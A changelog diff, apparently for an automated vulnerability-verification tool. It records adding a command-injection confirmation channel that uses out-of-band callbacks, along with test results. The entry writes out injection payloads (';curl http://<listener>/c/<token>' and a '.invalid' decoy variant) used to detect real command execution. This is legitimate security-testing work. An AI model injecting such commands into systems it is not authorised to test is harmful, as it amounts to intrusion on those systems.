@@ -6,6 +6,50 @@
 
 ## [未发布]
 
+### 新增（M18-a 第 6 类漏洞「命令注入 / RCE」的判定通道 —— 带外回调确认）
+
+**做了什么**：把命令注入做成**第 6 类可确认漏洞**的判定通道。裁定先行
+（`RULING_M18_CMDI.md`，维护者 2026-09-30 裁定）。
+
+**核心判据**：注入 `;curl http://<我们的 listener>/c/<token>` 之后，
+**宿主 listener 收到携带本次唯一 token 的请求**才算 Confirmed——带外二值事实。
+响应体里回显出来的 `curl ...` 文本、状态码、耗时**一律不作证据**。
+
+**复用了什么（一行不改）**：`verify/ssrf.py` 的 `CallbackListener`（含每探针唯一
+token 登记、常量时间比对、未登记 token 记 `ignored`）、`new_token`、`token_delivered`、
+`fetch`、`resolve_callback_host/bind/port` 与逃逸阀——**连限制 49 踩过的两个坑
+（`host.docker.internal` 不解析、告知/绑定地址混用会 `gaierror`）一并继承**。
+
+**净新增的防伪件：DNS 非命中变体**。交接单说"命令注入比 SSRF 还干净"，
+本轮复核**更正**：该结论对"响应回显被误读成执行"成立，但对
+**"目标前面挂着 WAF / 反向代理 / 截图服务，是它们在替我们抓取 URL"**
+**不成立**——那是本类型相对 SSRF 的**净新增假阳性来源**（SSRF 的载荷指向我们
+自己，不存在这种混淆）。对策：注入
+`;curl http://<随机 nonce 主机名>.invalid/c/<token>`——不可解析的名字，真 shell
+与代抓取的中间件**都**发不出我们能收到的请求 ⇒ **它若命中，说明命中来自第三方，
+整批判 blocked**。
+
+**落点（M17-c 的收益实测）**：`VULN_REGISTRY` **加一条登记**即可——`GATE_MATRIX`
+键、模型白名单、验证前置集全部自动派生。`requires_session=False`（判据与身份无关，
+这是与 `ssrf`/`unauth-exposure` 的关键差异）。另加 `skills/verify-cmdi/SKILL.md`
+（L2 只读）、`profiles.py` 登记（`mutating=False`）、`orchestrator._verify_cmdi`、
+`_verify_handlers` 挂载、**API 生产栈第 6 槽位**。
+
+**顺带修掉守护测试的一个真后门**：生产者守护原先把可达性写成「规则表产出 ∪
+模型白名单」，于是**任何**进了白名单的类型即便两条路都还没接也算"可达"
+（M18-a 加 `cmdi` 时就靠它蒙混过关）。已改为**按类型断言**：不在规则表产出里的
+类型必须显式声明 `model_channel_only=True` 且已核实（当前仅 `ssrf`）。
+
+**测试**：全量 **1308 passed / 1 xfailed**。新增 `tests/test_cmdi.py` 29 个
+（纯函数 16 / 真 listener 2 / 编排层 11，含 DNS 防线必须 blocked 的用例）。
+**旧测试改动 2 处，逐条披露**：`test_llm_triage.py` 的白名单逐字锁定集加 `cmdi`
+（沿用 M15 加 ssrf 先例）；`test_ssrf.py` 的 handler 覆盖面用例替身补
+`_verify_cmdi`、期望集加一项（沿用 M16-c 加 verify-unauth 同一处做法）。
+**两处断言意图均不变**。
+
+**1 个 strict xfail = 已知限制 61**：候选来源（`_CMDI_PARAM_HINTS` + 模型通道
+实测 + 独立上限）属 **M18-b**，尚未接上 ⇒ 真实扫描现在仍产不出 `cmdi` 候选。
+
 ### 变更（M17-c `VULN_REGISTRY` 单一真相源 —— 「加一个漏洞类型」只需登记一次）
 
 **做了什么**：把散在三处、**手工维护且互不校验**的漏洞类型事实收敛成一张表。
